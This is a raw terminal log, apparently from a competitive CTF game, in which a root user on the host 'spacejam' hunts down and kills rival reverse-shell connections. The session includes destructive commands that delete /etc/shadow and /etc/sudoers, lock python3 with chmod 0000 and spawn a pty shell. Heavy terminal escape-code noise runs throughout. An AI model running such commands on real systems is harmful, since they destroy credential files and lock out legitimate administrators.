apache2   1445   jordan   12u  IPv6  20616      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:56924 (ESTABLISHED).[m.[K
apache2   1446   jordan   12u  IPv6  20564      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:55236 (ESTABLISHED).[m.[K
apache2   1449   jordan   12u  IPv6  22777      0t0  TCP .[01;31m.[K10.10.46.213:80->10.8.160.93:57412 (ESTABLISHED).[m.[K
python3   1457     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python3   1457     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python3   1457     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python3   1457     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1458     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
sshd      1470     root    3u  IPv4  19883      0t0  TCP .[01;31m.[K10.10.46.213:22->10.2.66.237:60176 (ESTABLISHED).[m.[K
check-new 1496     root    3u  IPv4  21294      0t0  TCP .[01;31m.[K10.10.46.213:42914->185.125.190.18:80 (SYN_SENT).[m.[K
sshd      1533   jordan    3u  IPv4  19883      0t0  TCP .[01;31m.[K10.10.46.213:22->10.2.66.237:60176 (ESTABLISHED).[m.[K
apache2   1581   jordan   12u  IPv6  21333      0t0  TCP .[01;31m.[K10.10.46.213:80->10.8.160.93:57376 (ESTABLISHED).[m.[K
grep      1586     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
root@spacejam:/home# lsof -i -P -n|grep check-new
root@spacejam:/home# kill -9 1496
bash: kill: (1496) - No such process
root@spacejam:/home# w
 07:39:40 up 5 min,  1 user,  load average: 0.05, 0.46, 0.29
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jordan   pts/1    10.2.66.237      07:37   12.00s  0.04s  0.04s -bash
root@spacejam:/home# pkill -9 -t pts/1
root@spacejam:/home# w
 07:39:51 up 6 min,  0 users,  load average: 0.04, 0.44, 0.29
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:/home# userdel jordan
userdel: user jordan is currently used by process 1219
root@spacejam:/home# w
 07:39:57 up 6 min,  0 users,  load average: 0.04, 0.44, 0.29
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:/home# ko..[Kill -9 1219;userdel jordan
userdel: user jordan is currently used by process 1238
root@spacejam:/home# w
 07:40:08 up 6 min,  0 users,  load average: 0.03, 0.42, 0.28
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:/home# rm -rf /etc/sha.dow
root@spacejam:/home# rm -rf /etc/sudoe.rs
root@spacejam:/home# w
 07:40:19 up 6 min,  0 users,  load average: 0.03, 0.41, 0.28
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:/home# w
 07:40:42 up 6 min,  0 users,  load average: 0.09, 0.39, 0.28
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:/home# ls -la /dev/pts
total 0
drwxr-xr-x  2 root root      0 Nov 18 07:33 .[0m.[01;34m..[0m
drwx------ 17 root root   3700 Nov 18 07:34 .[01;34m...[0m
crw--w----  1 root tty  136, 0 Nov 18 07:40 .[01;33m0.[0m
crw--w----  1 root tty  136, 1 Nov 18 07:40 .[01;33m1.[0m
c---------  1 root root   5, 2 Nov 18 07:33 .[01;33mptmx.[0m
root@spacejam:/home# w
 07:40:48 up 6 min,  0 users,  load average: 0.08, 0.38, 0.27
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:/home# 
.[1@(reverse-i-search)`':.[C...l': ls -la /dev/pts...................[1@s.[C.[C.[C...o': lsof -i -P -n|grep check-new
.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C....[1@f.[C.[C.[C
.[5Proot@spacejam:/home#.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.5check-new.........~check-new...........[1Pcheck-new...........[1Pcheck-new..........[1Pheck-new.........[1Peck-new........[1Pck-new.......[1Pk-new......[1P-new.....[1Pnew....[1Pew...[1Pw..[K..............10.10.*.[H.[2Jroot@spacejam:/home# lsof -i -P -n|grep 10.10.*
apache2   1238   jordan   12u  IPv6  24167      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35900 (ESTABLISHED).[m.[K
apache2   1239   jordan   12u  IPv6  23506      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:53278 (ESTABLISHED).[m.[K
apache2   1240   jordan   12u  IPv6  24216      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35894 (ESTABLISHED).[m.[K
apache2   1245   jordan   12u  IPv6  24211      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:60898 (ESTABLISHED).[m.[K
apache2   1248   jordan   12u  IPv6  23587      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35670 (ESTABLISHED).[m.[K
apache2   1252   jordan   12u  IPv6  24217      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35928 (ESTABLISHED).[m.[K
http      1287     _apt    3u  IPv4  24261      0t0  TCP .[01;31m.[K10.10.46.213:45934->72.32.157.246:80 (SYN_SENT).[m.[K
http      1289     _apt    3u  IPv4  24259      0t0  TCP .[01;31m.[K10.10.46.213:40112->91.189.91.82:80 (SYN_SENT).[m.[K
http      1290     _apt    3u  IPv4  24262      0t0  TCP .[01;31m.[K10.10.46.213:47458->91.189.91.83:80 (SYN_SENT).[m.[K
node      1308     root   21u  IPv6  19407      0t0  TCP .[01;31m.[K10.10.46.213:3000->10.17.76.221:43890 (ESTABLISHED).[m.[K
node      1308     root   23u  IPv6  23119      0t0  TCP .[01;31m.[K10.10.46.213:3000->10.8.160.93:43916 (ESTABLISHED).[m.[K
node      1308     root   27u  IPv6  23550      0t0  TCP .[01;31m.[K10.10.46.213:3000->10.17.46.25:54778 (ESTABLISHED).[m.[K
apache2   1315   jordan   12u  IPv6  24224      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35962 (ESTABLISHED).[m.[K
apache2   1317   jordan   12u  IPv6  23495      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:53242 (ESTABLISHED).[m.[K
apache2   1322   jordan   12u  IPv6  23579      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:60928 (ESTABLISHED).[m.[K
apache2   1323   jordan   12u  IPv6  24255      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35996 (ESTABLISHED).[m.[K
bash      1327     root    0u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root  255u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
apache2   1345   jordan   12u  IPv6  23492      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:53224 (ESTABLISHED).[m.[K
tcpdump   1349     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
tcpdump   1349     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
systemd-p 1361     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
systemd-p 1361     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
python3   1380   jordan    4u  IPv4  18935      0t0  TCP .[01;31m.[K10.10.46.213:61432->10.17.46.25:42148 (ESTABLISHED).[m.[K
python    1399     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1399     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1399     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1399     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root  255u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
apache2   1413   jordan   12u  IPv6  23505      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:53264 (ESTABLISHED).[m.[K
apache2   1414   jordan   12u  IPv6  23392      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:52122 (ESTABLISHED).[m.[K
apache2   1417   jordan   12u  IPv6  24220      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35976 (ESTABLISHED).[m.[K
apache2   1418   jordan   12u  IPv6  24218      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35940 (ESTABLISHED).[m.[K
apache2   1428   jordan   12u  IPv6  23375      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:52068 (ESTABLISHED).[m.[K
apache2   1429   jordan   12u  IPv6  24254      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35984 (ESTABLISHED).[m.[K
apache2   1430   jordan   12u  IPv6  23583      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35662 (ESTABLISHED).[m.[K
apache2   1431   jordan   12u  IPv6  23366      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:52066 (ESTABLISHED).[m.[K
apache2   1435   jordan   12u  IPv6  24166      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35916 (ESTABLISHED).[m.[K
apache2   1437   jordan   12u  IPv6  24237      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:36010 (ESTABLISHED).[m.[K
apache2   1443   jordan   12u  IPv6  23595      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35682 (ESTABLISHED).[m.[K
apache2   1445   jordan   12u  IPv6  24219      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35948 (ESTABLISHED).[m.[K
apache2   1446   jordan   12u  IPv6  24170      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35936 (ESTABLISHED).[m.[K
python3   1457     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python3   1457     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python3   1457     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python3   1457     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1458     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1634     root    0u  IPv4  23131      0t0  TCP .[01;31m.[K10.10.46.213:34480->10.8.160.93:4444 (ESTABLISHED).[m.[K
bash      1634     root    1u  IPv4  23131      0t0  TCP .[01;31m.[K10.10.46.213:34480->10.8.160.93:4444 (ESTABLISHED).[m.[K
bash      1634     root    2u  IPv4  23131      0t0  TCP .[01;31m.[K10.10.46.213:34480->10.8.160.93:4444 (ESTABLISHED).[m.[K
bash      1634     root  255u  IPv4  23131      0t0  TCP .[01;31m.[K10.10.46.213:34480->10.8.160.93:4444 (ESTABLISHED).[m.[K
python3   1672     root    0u  IPv4  23562      0t0  TCP .[01;31m.[K10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED).[m.[K
python3   1672     root    1u  IPv4  23562      0t0  TCP .[01;31m.[K10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED).[m.[K
python3   1672     root    2u  IPv4  23562      0t0  TCP .[01;31m.[K10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED).[m.[K
python3   1672     root    3u  IPv4  23562      0t0  TCP .[01;31m.[K10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED).[m.[K
grep      1719     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
root@spacejam:/home# which python3
/usr/bin/python3
root@spacejam:/home# chmod 0000 /usr/bin/python3
root@spacejam:/home# chmod 0000 /usr/bin/python3
.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[C.[14Pwhich python3.............lsof -i -P -n|grep 10.10.*.[H.[2Jroot@spacejam:/home# lsof -i -P -n|grep 10.10.*
apache2   1238   jordan   12u  IPv6  24167      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35900 (ESTABLISHED).[m.[K
apache2   1239   jordan   12u  IPv6  23506      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:53278 (ESTABLISHED).[m.[K
apache2   1240   jordan   12u  IPv6  24216      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35894 (ESTABLISHED).[m.[K
apache2   1245   jordan   12u  IPv6  24211      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:60898 (ESTABLISHED).[m.[K
apache2   1248   jordan   12u  IPv6  23587      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35670 (ESTABLISHED).[m.[K
apache2   1249   jordan   12u  IPv6  24285      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:54282 (ESTABLISHED).[m.[K
apache2   1252   jordan   12u  IPv6  24217      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35928 (ESTABLISHED).[m.[K
http      1287     _apt    3u  IPv4  24261      0t0  TCP .[01;31m.[K10.10.46.213:45934->72.32.157.246:80 (SYN_SENT).[m.[K
http      1289     _apt    3u  IPv4  24259      0t0  TCP .[01;31m.[K10.10.46.213:40112->91.189.91.82:80 (SYN_SENT).[m.[K
http      1290     _apt    3u  IPv4  24262      0t0  TCP .[01;31m.[K10.10.46.213:47458->91.189.91.83:80 (SYN_SENT).[m.[K
node      1308     root   21u  IPv6  19407      0t0  TCP .[01;31m.[K10.10.46.213:3000->10.17.76.221:43890 (ESTABLISHED).[m.[K
node      1308     root   23u  IPv6  23119      0t0  TCP .[01;31m.[K10.10.46.213:3000->10.8.160.93:43916 (ESTABLISHED).[m.[K
node      1308     root   27u  IPv6  23550      0t0  TCP .[01;31m.[K10.10.46.213:3000->10.17.46.25:54778 (ESTABLISHED).[m.[K
apache2   1315   jordan   12u  IPv6  24224      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35962 (ESTABLISHED).[m.[K
apache2   1317   jordan   12u  IPv6  23495      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:53242 (ESTABLISHED).[m.[K
apache2   1322   jordan   12u  IPv6  23579      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:60928 (ESTABLISHED).[m.[K
apache2   1323   jordan   12u  IPv6  24255      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35996 (ESTABLISHED).[m.[K
bash      1327     root    0u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
bash      1327     root  255u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
apache2   1344   jordan   12u  IPv6  24284      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:54274 (ESTABLISHED).[m.[K
apache2   1345   jordan   12u  IPv6  23492      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:53224 (ESTABLISHED).[m.[K
tcpdump   1349     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
tcpdump   1349     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
systemd-p 1361     root    1u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
systemd-p 1361     root    2u  IPv4  17904      0t0  TCP .[01;31m.[K10.10.46.213:39474->10.2.66.237:47983 (ESTABLISHED).[m.[K
python3   1380   jordan    4u  IPv4  18935      0t0  TCP .[01;31m.[K10.10.46.213:61432->10.17.46.25:42148 (ESTABLISHED).[m.[K
python    1399     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1399     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1399     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python    1399     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1400     root  255u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
apache2   1413   jordan   12u  IPv6  23505      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:53264 (ESTABLISHED).[m.[K
apache2   1417   jordan   12u  IPv6  24220      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35976 (ESTABLISHED).[m.[K
apache2   1418   jordan   12u  IPv6  24218      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35940 (ESTABLISHED).[m.[K
apache2   1424   jordan   12u  IPv6  24279      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:54266 (ESTABLISHED).[m.[K
apache2   1429   jordan   12u  IPv6  24254      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35984 (ESTABLISHED).[m.[K
apache2   1435   jordan   12u  IPv6  24166      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35916 (ESTABLISHED).[m.[K
apache2   1437   jordan   12u  IPv6  24237      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:36010 (ESTABLISHED).[m.[K
apache2   1441   jordan   12u  IPv6  24273      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:37100 (ESTABLISHED).[m.[K
apache2   1445   jordan   12u  IPv6  24219      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:35948 (ESTABLISHED).[m.[K
apache2   1449   jordan   12u  IPv6  24286      0t0  TCP .[01;31m.[K10.10.46.213:80->10.17.46.25:54284 (ESTABLISHED).[m.[K
python3   1457     root    0u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python3   1457     root    1u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python3   1457     root    2u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
python3   1457     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1458     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
bash      1634     root    0u  IPv4  23131      0t0  TCP .[01;31m.[K10.10.46.213:34480->10.8.160.93:4444 (ESTABLISHED).[m.[K
bash      1634     root    1u  IPv4  23131      0t0  TCP .[01;31m.[K10.10.46.213:34480->10.8.160.93:4444 (ESTABLISHED).[m.[K
bash      1634     root    2u  IPv4  23131      0t0  TCP .[01;31m.[K10.10.46.213:34480->10.8.160.93:4444 (ESTABLISHED).[m.[K
bash      1634     root  255u  IPv4  23131      0t0  TCP .[01;31m.[K10.10.46.213:34480->10.8.160.93:4444 (ESTABLISHED).[m.[K
python3   1672     root    0u  IPv4  23562      0t0  TCP .[01;31m.[K10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED).[m.[K
python3   1672     root    1u  IPv4  23562      0t0  TCP .[01;31m.[K10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED).[m.[K
python3   1672     root    2u  IPv4  23562      0t0  TCP .[01;31m.[K10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED).[m.[K
python3   1672     root    3u  IPv4  23562      0t0  TCP .[01;31m.[K10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED).[m.[K
grep      1724     root    3u  IPv4  19456      0t0  TCP .[01;31m.[K10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED).[m.[K
root@spacejam:/home# lsof -i -P -n|grep 10.10.*.............[C.[C.[C.[C.[C.[1P0.10.*.......[1P.10.*......[1P10.*.....[1P0.*....[1P.*...[1P*..[K......................python*.[H.[2Jroot@spacejam:/home# lsof -i -P -n|grep python*
.[01;31m.[Kpython.[m.[K3   1380   jordan    3u  IPv4  18934      0t0  TCP *:61432 (LISTEN)
.[01;31m.[Kpython.[m.[K3   1380   jordan    4u  IPv4  18935      0t0  TCP 10.10.46.213:61432->10.17.46.25:42148 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K    1399     root    0u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K    1399     root    1u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K    1399     root    2u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K    1399     root    3u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K3   1457     root    0u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K3   1457     root    1u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K3   1457     root    2u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K3   1457     root    3u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K3   1672     root    0u  IPv4  23562      0t0  TCP 10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K3   1672     root    1u  IPv4  23562      0t0  TCP 10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K3   1672     root    2u  IPv4  23562      0t0  TCP 10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED)
.[01;31m.[Kpython.[m.[K3   1672     root    3u  IPv4  23562      0t0  TCP 10.10.46.213:47924->10.17.46.25:1234 (ESTABLISHED)
root@spacejam:/home# kill -9 1380 1399 1457 1672 bash: [1400: 2 (255)] tcsetattr: Inappropriate ioctl for device
root@spacejam:/# python3 -c 'import . .. .. .. .. .. .. .. .. .. .. .. .. .. .n -c 'import pty;pty.spawn("/bin/bash")'
root@spacejam:/# reset
reset: unknown terminal type unknown
Terminal type? clear
reset: unknown terminal type clear
Terminal type? term
reset: unknown terminal type term
Terminal type? yes
reset: unknown terminal type yes
Terminal type? 
Terminal type? ^C
root@spacejam:/# 
root@spacejam:/# ls -la
total 96
drwxr-xr-x  23 root root  4096 Nov 18 07:36 .
drwxr-xr-x  23 root root  4096 Nov 18 07:36 ..
drwx------   2 root root  4096 Apr  4  2020 bin
drwx------   3 root root  4096 Feb 25  2020 boot
drwx------  17 root root  3700 Nov 18 07:34 dev
drwx------ 103 root root  4096 Nov 18 07:40 etc
drwx------   4 root root  4096 Feb 25  2020 home
lrwxrwxrwx   1 root root    33 Feb 25  2020 initrd.img -> boot/initrd.img-4.4.0-142-generic
drwx------  22 root root  4096 Feb 25  2020 lib
drwx------   2 root root  4096 Feb 25  2020 lib64
drwx------   2 root root 16384 Feb 25  2020 lost+found
drwx------   3 root root  4096 Feb 25  2020 media
drwx------   2 root root  4096 Feb 26  2019 mnt
drwx------   2 root root  4096 Feb 26  2019 opt
drwx------ 147 root root     0 Nov 18 07:33 proc
drwx------   7 root root  4096 Apr  4  2020 root
drwx------  25 root root   920 Nov 18 07:37 run
drwx------   2 root root 12288 Feb 25  2020 sbin
drwx------   2 root root  4096 Feb 25  2020 snap
drwx------   3 root root  4096 Feb 25  2020 srv
drwx------  13 root root     0 Nov 18 07:37 sys
drwx------   7 root root  4096 Nov 18 07:40 tmp
drwx------  10 root root  4096 Feb 25  2020 usr
drwx------  14 root root  4096 Feb 25  2020 var
lrwxrwxrwx   1 root root    30 Feb 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-142-generic
root@spacejam:/# clear
TERM environment variable not set.
root@spacejam:/# 
(reverse-i-search)`': ...l': clear........s': ls -la.......

(failed reverse-i-search)`lso': ls -la..........f': ls -la......
root@spacejam:/# ls -la                ................
total 96
drwxr-xr-x  23 root root  4096 Nov 18 07:36 .
drwxr-xr-x  23 root root  4096 Nov 18 07:36 ..
drwx------   2 root root  4096 Apr  4  2020 bin
drwx------   3 root root  4096 Feb 25  2020 boot
drwx------  17 root root  3700 Nov 18 07:34 dev
drwx------ 103 root root  4096 Nov 18 07:40 etc
drwx------   4 root root  4096 Feb 25  2020 home
lrwxrwxrwx   1 root root    33 Feb 25  2020 initrd.img -> boot/initrd.img-4.4.0-142-generic
drwx------  22 root root  4096 Feb 25  2020 lib
drwx------   2 root root  4096 Feb 25  2020 lib64
drwx------   2 root root 16384 Feb 25  2020 lost+found
drwx------   3 root root  4096 Feb 25  2020 media
drwx------   2 root root  4096 Feb 26  2019 mnt
drwx------   2 root root  4096 Feb 26  2019 opt
drwx------ 147 root root     0 Nov 18 07:33 proc
drwx------   7 root root  4096 Apr  4  2020 root
drwx------  25 root root   920 Nov 18 07:37 run
drwx------   2 root root 12288 Feb 25  2020 sbin
drwx------   2 root root  4096 Feb 25  2020 snap
drwx------   3 root root  4096 Feb 25  2020 srv
drwx------  13 root root     0 Nov 18 07:37 sys
drwx------   7 root root  4096 Nov 18 07:40 tmp
drwx------  10 root root  4096 Feb 25  2020 usr
drwx------  14 root root  4096 Feb 25  2020 var
lrwxrwxrwx   1 root root    30 Feb 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-142-generic
root@spacejam:/# 
root@spacejam:/# lsof -i -P -n|grep ptyhon*
root@spacejam:/# lsof -i -P -n|grep ptyhon*
root@spacejam:/# lsof -i -P -n|grep ptyhon*. .. .. .. .. .. .ython*
root@spacejam:/# lsof -i -P -n|grep python*
python    1745     root    0u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
python    1745     root    1u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
python    1745     root    2u  IPv4  19456      0t0  TCP 10.10.46.213:34920->10.10.25.156:1337 (ESTABLISHED)
